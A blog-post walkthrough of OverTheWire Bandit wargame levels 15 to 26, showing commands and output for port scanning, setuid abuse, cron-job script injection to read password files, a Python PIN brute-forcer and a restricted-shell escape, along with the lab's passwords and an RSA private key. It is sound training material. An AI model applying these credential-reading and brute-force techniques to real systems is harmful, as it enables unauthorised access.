---
comments: true
date: 2015-03-13T00:00:00Z
image:
  credit: null
  creditlink: null
  feature: http://i.imgur.com/OHpNwbR.png
modified: 2015-03-13 21:29:29 +0000
share: null
addtoc: true
tags:
- ctf
- security
- hack
- overthewire
- bandit
title: Let's crack Bandit Part 2
url: /2015/03/13/lets-crack-bandit-part2/
---

Continues on from [Let's crack Bandit Part 1](http://unlogic.co.uk/2015/03/13/lets-crack-bandit-part1)

# Level 15 -> 16 #

[Level 15](http://overthewire.org/wargames/bandit/bandit16.html)

Eventhough this is very similar to the previous level, it's a little
more complicated as we need to connect with SSL.
The simplest way is using `openssl` with `s_client`. Once connected it's the
same dance as above

{{< highlight console >}}
bandit15@melinda:~$ openssl s_client -quiet -connect localhost:30001
depth=0 CN = li190-250.members.linode.com
verify error:num=18:self signed certificate
verify return:1
depth=0 CN = li190-250.members.linode.com
verify return:1
BfMYroe26WYalil77FoDi9qh59eK5xNr
Correct!
cluFn7wTiGryunymYOu4RcffSxQluehd

read:errno=0
{{< / highlight >}}

# Level 16 -> 17 #

[Level 16](http://overthewire.org/wargames/bandit/bandit17.html)

Here we have a choice. We run a simple ping scan across the port range and then
figure out which port is the right one by trying each one. Depending on the number
of ports open this could take a while or not.
Let's see how we're going to handle this by seeing which ports are open

{{< highlight console >}}
bandit16@melinda:~$ nmap localhost -p 31000-32000 

Starting Nmap 6.40 ( http://nmap.org ) at 2015-03-20 14:54 UTC
Nmap scan report for localhost (127.0.0.1)
Host is up (0.00080s latency).
Not shown: 996 closed ports
PORT      STATE SERVICE
31046/tcp open  unknown
31518/tcp open  unknown
31691/tcp open  unknown
31790/tcp open  unknown
31960/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 0.08 seconds
{{< / highlight >}}

Not too bad. Because it's a short list, we can try them one by one, or
we run a service discovery on them. Service discovery in nmap takes a while,
so I only scan the ports we are interseted in:

{{< highlight console >}}
bandit16@melinda:~$ nmap -sV -p 31046,31518,31691,31790,31960 localhost

Starting Nmap 6.40 ( http://nmap.org ) at 2015-03-20 14:51 UTC
Nmap scan report for localhost (127.0.0.1)
Host is up (0.00015s latency).
PORT      STATE SERVICE VERSION
31046/tcp open  echo
31518/tcp open  msdtc   Microsoft Distributed Transaction Coordinator (error)
31691/tcp open  echo
31790/tcp open  msdtc   Microsoft Distributed Transaction Coordinator (error)
31960/tcp open  echo
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
{{< / highlight >}}

Now we only have two ports to try, as the others are clearly just echo ports.
Eliminating one we go ahead and

{{< highlight console >}}
bandit16@melinda:~$ openssl s_client -quiet -connect localhost:31790
depth=0 CN = li190-250.members.linode.com
verify error:num=18:self signed certificate
verify return:1
depth=0 CN = li190-250.members.linode.com
verify return:1
cluFn7wTiGryunymYOu4RcffSxQluehd
Correct!
-----BEGIN RSA PRIVATE KEY-----
MIIEogIBAAKCAQEAvmOkuifmMg6HL2YPIOjon6iWfbp7c3jx34YkYWqUH57SUdyJ
imZzeyGC0gtZPGujUSxiJSWI/oTqexh+cAMTSMlOJf7+BrJObArnxd9Y7YT2bRPQ
Ja6Lzb558YW3FZl87ORiO+rW4LCDCNd2lUvLE/GL2GWyuKN0K5iCd5TbtJzEkQTu
DSt2mcNn4rhAL+JFr56o4T6z8WWAW18BR6yGrMq7Q/kALHYW3OekePQAzL0VUYbW
JGTi65CxbCnzc/w4+mqQyvmzpWtMAzJTzAzQxNbkR2MBGySxDLrjg0LWN6sK7wNX
x0YVztz/zbIkPjfkU1jHS+9EbVNj+D1XFOJuaQIDAQABAoIBABagpxpM1aoLWfvD
KHcj10nqcoBc4oE11aFYQwik7xfW+24pRNuDE6SFthOar69jp5RlLwD1NhPx3iBl
J9nOM8OJ0VToum43UOS8YxF8WwhXriYGnc1sskbwpXOUDc9uX4+UESzH22P29ovd
d8WErY0gPxun8pbJLmxkAtWNhpMvfe0050vk9TL5wqbu9AlbssgTcCXkMQnPw9nC
YNN6DDP2lbcBrvgT9YCNL6C+ZKufD52yOQ9qOkwFTEQpjtF4uNtJom+asvlpmS8A
vLY9r60wYSvmZhNqBUrj7lyCtXMIu1kkd4w7F77k+DjHoAXyxcUp1DGL51sOmama
+TOWWgECgYEA8JtPxP0GRJ+IQkX262jM3dEIkza8ky5moIwUqYdsx0NxHgRRhORT
8c8hAuRBb2G82so8vUHk/fur85OEfc9TncnCY2crpoqsghifKLxrLgtT+qDpfZnx
SatLdt8GfQ85yA7hnWWJ2MxF3NaeSDm75Lsm+tBbAiyc9P2jGRNtMSkCgYEAypHd
HCctNi/FwjulhttFx/rHYKhLidZDFYeiE/v45bN4yFm8x7R/b0iE7KaszX+Exdvt
SghaTdcG0Knyw1bpJVyusavPzpaJMjdJ6tcFhVAbAjm7enCIvGCSx+X3l5SiWg0A
R57hJglezIiVjv3aGwHwvlZvtszK6zV6oXFAu0ECgYAbjo46T4hyP5tJi93V5HDi
Ttiek7xRVxUl+iU7rWkGAXFpMLFteQEsRr7PJ/lemmEY5eTDAFMLy9FL2m9oQWCg
R8VdwSk8r9FGLS+9aKcV5PI/WEKlwgXinB3OhYimtiG2Cg5JCqIZFHxD6MjEGOiu
L8ktHMPvodBwNsSBULpG0QKBgBAplTfC1HOnWiMGOU3KPwYWt0O6CdTkmJOmL8Ni
blh9elyZ9FsGxsgtRBXRsqXuz7wtsQAgLHxbdLq/ZJQ7YfzOKU4ZxEnabvXnvWkU
YOdjHdSOoKvDQNWu6ucyLRAWFuISeXw9a/9p7ftpxm0TSgyvmfLF2MIAEwyzRqaM
77pBAoGAMmjmIJdjp+Ez8duyn3ieo36yrttF5NSsJLAbxFpdlc1gvtGCWW+9Cq0b
dxviW8+TFVEBl1O4f7HVm6EpTscdDxU+bCXWkfjuRb7Dy9GOtt9JPsX8MBTakzh3
vBgsyi/sN3RqRBcGU40fOoZyfAMT8s1m/uYv52O6IgeuZ/ujbjY=
-----END RSA PRIVATE KEY-----

read:errno=0
{{< / highlight >}}

Now copy that key into a new file and use `chmod go-rw key` to remove group
and other read/write. ssh refuses to accept a key that is read/write by
anyone other than the user who owns the file. Then simply

{{< highlight console >}}
bandit16@melinda:~$ ssh -i /tmp/k.key bandit17@localhost
{{< / highlight >}}

# Level 17 -> 18 #

[Level 17](http://overthewire.org/wargames/bandit/bandit18.html)

We remain logged in as bandit17 from the previous level. To compare two files
we need to do a `diff`

{{< highlight console >}}
bandit17@melinda:~$ diff passwords.old  passwords.new 
42c42
< BS8bqB1kqkinKJjuxL6k072Qq9NRwQpR
---
> kfBf3eYk5BPBRzwjqutbbfE887SVc5Yd
{{< / highlight >}}

The latter output is the entry in the `password.new` file, and thus the password
for bandit18.

# Level 18 -> 19 #

[Level 18](http://overthewire.org/wargames/bandit/bandit19.html)

Oh noes. We get logged out as soon as we log in because some nefarious
individual has been editing our `.bashrc` file. Well in that case
we need to launch bash without an rc file.

{{< highlight console >}}
ssh bandit18@bandit.labs.overthewire.org '/bin/bash --norc'
cat readme
IueksS7Ubh8G3DCwVzrTd8rAVOwq3M5x
{{< / highlight >}}

Because we launched without an rc file there's not going to be a prompt.
All we need to do is cat the `readme` file and the password is ours.

# Level 19 -> 20 #

[Level 19](http://overthewire.org/wargames/bandit/bandit20.html)

Here we learn about setuid binaries. Basically this is a binary that a user can
run, but when executed runs as the setuid user. To explain, long list the file

{{< highlight console >}}
bandit19@melinda:~$ ls -al
total 28
drwxr-xr-x   2 root     root     4096 Nov 14 10:32 .
drwxr-xr-x 167 root     root     4096 Jan 12 17:44 ..
-rw-r--r--   1 root     root      220 Apr  9  2014 .bash_logout
-rw-r--r--   1 root     root     3637 Apr  9  2014 .bashrc
-rw-r--r--   1 root     root      675 Apr  9  2014 .profile
-rwsr-x---   1 bandit20 bandit19 7370 Nov 14 10:32 bandit20-do
{{< / highlight >}}

So you see it's owned by `bandit20` and the *s* bit is set in `-rwsr-x---`. That's
how we identify setuid binaries.

Let's make use of it. This will run any command we supply, as the user `bandit20`,
so let's simply print the password

{{< highlight console >}}
bandit19@melinda:~$ ./bandit20-do cat /etc/bandit_pass/bandit20
GbKksEFF4yrVs6il55v6gwY5aVje5f0j
{{< / highlight >}}

# Level 20 -> 21 #

[Level 20](http://overthewire.org/wargames/bandit/bandit21.html)

Now we're entering a more complicated example of networking. Not only do we need
to connect to a host, we have to create the host to connect to. Once
`suconnect` is connected, we must pass it the password and in return we get the
one for the next level.

Let's log into a new shell to create our server with `netcat`

{{< highlight console >}}
bandit20@melinda:~$ nc -vlk 31337
Listening on [0.0.0.0] (family 0, port 31337)
{{< / highlight >}}

The option `vlk` is `verbose`, `listen`, and `keep-open`. Ok, we're listening
and now, from another terminal, we log into level 20 and execute `suconnect`. From
our listening terminal, once we see an established connection, we send the password,
and get our new one back.

{{< highlight console >}}
# terminal 2
bandit20@melinda:~$ ./suconnect  31337

# terminal 1
Connection from [127.0.0.1] port 31337 [tcp/*] accepted (family 2, sport 43463)
GbKksEFF4yrVs6il55v6gwY5aVje5f0j
gE269g2h3mw3pwgrj0Ha9Uoqen1c9DGr
{{< / highlight >}}

# Level 21 -> 22 #

[Level 21](http://overthewire.org/wargames/bandit/bandit22.html)

First let's list the crontabs in the directory supplied. Our likely
candidate is `/etc/cron.d/cronjob_bandit22` so let's see what it runs
and also what that script contains

{{< highlight console >}}
cat /etc/cron.d/cronjob_bandit22
* * * * * bandit22 /usr/bin/cronjob_bandit22.sh &> /dev/null
bandit21@melinda:~$ cat /usr/bin/cronjob_bandit22.sh
#!/bin/bash
chmod 644 /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
cat /etc/bandit_pass/bandit22 > /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
{{< / highlight >}}

So basically it copies the password for the next level into a file in `/tmp`.

{{< highlight console >}}
bandit21@melinda:~$ cat /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
Yk7owGAcWjwMVRwrTesJEwB7WVOiILLI
{{< / highlight >}}

# Level 22 -> 23 #

[Level 22](http://overthewire.org/wargames/bandit/bandit22.html)

Pretty similar to above but with a different script

{{< highlight console >}}
bandit22@melinda:~$ cat /etc/cron.d/cronjob_bandit23
* * * * * bandit23 /usr/bin/cronjob_bandit23.sh  &> /dev/null
bandit22@melinda:~$ cat /usr/bin/cronjob_bandit23.sh
#!/bin/bash

myname=$(whoami)
mytarget=$(echo I am user $myname | md5sum | cut -d ' ' -f 1)

echo "Copying passwordfile /etc/bandit_pass/$myname to /tmp/$mytarget"

cat /etc/bandit_pass/$myname > /tmp/$mytarget
{{< / highlight >}}

This script takes the string `I am user $myname` and hashes it with an md5
then puts the next password into a file in `/tmp` with that filename. The easiest 
thing to do is to see what the filename will be. It will run as `bandit23` so
`whoami` will return that string.

{{< highlight console >}}
bandit22@melinda:~$ echo I am user bandit23 | md5sum | cut -d ' ' -f 1
8ca319486bfbbc3663ea0fbe81326349
bandit22@melinda:~$ cat /tmp/8ca319486bfbbc3663ea0fbe81326349
jc1udXuA1tiHqjIsL8yaapX5XIAI6i0n
{{< / highlight >}}

# Level 23 -> 24 #

[Level 23](http://overthewire.org/wargames/bandit/bandit24.html)

Once again....

{{< highlight console >}}
bandit23@melinda:~$ cat /etc/cron.d/cronjob_bandit24
* * * * * bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
bandit23@melinda:~$ cat /usr/bin/cronjob_bandit24.sh
#!/bin/bash

myname=$(whoami)

cd /var/spool/$myname
echo "Executing and deleting all scripts in /var/spool/$myname:"
for i in *;
do
    echo "Handling $i"
    ./$i
    rm -f $i
done

{{< / highlight >}}

So anything in `/var/spool/bandit24` will get run as bandit24. Checking if we
can write to that directory show us

{{< highlight console >}}
bandit23@melinda:~$ ls -la /var/spool/
total 21
drwxr-xr-x  6 root     root     4096 Nov 15 14:55 .
drwxr-xr-x 15 root     root     4096 Nov 14 10:32 ..
drwxrwx---  2 bandit24 bandit23 1024 Mar 20 15:38 bandit24
{{< / highlight >}}

that we can. Excellent. So let's write a script to cat the password to a tmp file.

{{< highlight console >}}
!#/bin/bash
cat /etc/bandit_pass/bandit24 > /tmp/unl.pass
{{< / highlight >}}

Make it executable, copy it to the right directory and then harvest the key

{{< highlight console >}}
bandit23@melinda:/tmp$ chmod +x t.sh
bandit23@melinda:/tmp$ cp t.sh /var/spool/bandit24/
bandit23@melinda:/tmp$ cat /tmp/unl.pass
UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ
{{< / highlight >}}

# Level 24 -> 25 #

[Level 24](http://overthewire.org/wargames/bandit/bandit25.html)

Here we need to bruteforce our way to the password. No point entering our
tries by hand, so let's leverage the power of bash. First create a loop
to print the values, so we can be sure the input to the netcat command is 
going to be right

{{< highlight console >}}
bandit24@melinda:~$ for i in $(seq -f "%04g" 0 9999); do echo 'UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ '${i}; done
.
.
UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ 9856
UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ 9857
.
.
{{< / highlight >}}

seems to ne what we want. Let's actually pass it onto the command. Because each 
iteration will take a while, we have plenty of time to stop it when it finds the 
right answer

{{< highlight console >}}
bandit24@melinda:~$ for i in $(seq -f "%04g" 0 9999); do echo 'UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ '${i} | nc localhost 30002; done 
{{< / highlight >}}

But who wants to sit there watching a screen? A quick Python script and we can 
leave it running until it finds the right PIN.
Sometimes you just have to be patient.

{{< highlight python >}}
import socket

def netcat(hostname, port, content):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((hostname, port))
    s.sendall(content)
    s.shutdown(socket.SHUT_WR)
    while 1:
        data = s.recv(1024)
        if data == "":
            break
        if 'I am the pincode' in repr(data):
            continue

        if 'Wrong' in repr(data):
            print 'no:', content
            return 0
        else:
            print repr(data)
            print content
            return 1

    print "Connection closed."
    s.close()

import sys

passw = 'UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ'
count = 0
while (1):
    trypass = '%s %04d' % (passw, count)
    if (netcat('localhost', 30002, trypass)):
        break
    count += 1
{{< / highlight >}}

Some time passes..... 

{{< highlight console >}}
no: UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ 5668
'Correct!\nThe password of user bandit25 is uNG9O58gUE7snukf3bvZ0rxhtnjzSGzG\n\nExiting.\n'
UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ 5669
bandit24@melinda:~$ 
{{< / highlight >}}

# Level 25 -> 26 #

[Level 25](http://overthewire.org/wargames/bandit/bandit26.html)

Ok, so first we need to see what happens when we log in as Bandit26

{{< highlight console >}}
bandit25@melinda:~$ ssh -i bandit26.sshkey bandit26@localhost
  _                     _ _ _   ___   __  
 | |                   | (_) | |__ \ / /  
 | |__   __ _ _ __   __| |_| |_   ) / /_  
 | '_ \ / _` | '_ \ / _` | | __| / / '_ \ 
 | |_) | (_| | | | | (_| | | |_ / /| (_) |
 |_.__/ \__,_|_| |_|\__,_|_|\__|____\___/ 
Connection to localhost closed.
{{< / highlight >}}

Hrm... ok, let's check the shell bandit26 uses:

{{< highlight console >}}
bandit25@melinda:/home/bandit25$ cat /etc/passwd | grep bandit26
bandit26:x:11026:11026:bandit level 26:/home/bandit26:/usr/bin/showtext
bandit25@melinda:/home/bandit25$ cat /usr/bin/showtext
#!/bin/sh

more ~/text.txt
exit 0

{{< / highlight >}}

Interesting. So we need to break out of `more` somehow. With `more` we
can go into interactive mode if we can figure out how to pause it. 
We can do that by limiting how much it can output to the screen.
The ASCII art above is about 8 lines, let's resize the terminal to 5 lines 
or something, and when it pauses, hit 'v' to open an editor.

Once in the editor simply open `/etc/bandit_pass/bandit26` and the password 
is: `5czgV9L3Xx8JPOyRbXh6lQbmIOWvPT6Z`

And that's the last password in the list, and thus the end of the game.

It was good fun and had a nice incrementing level of difficulty

Hope you had as much fun as me playing this. Next time we'll tackle `Leviathan`.
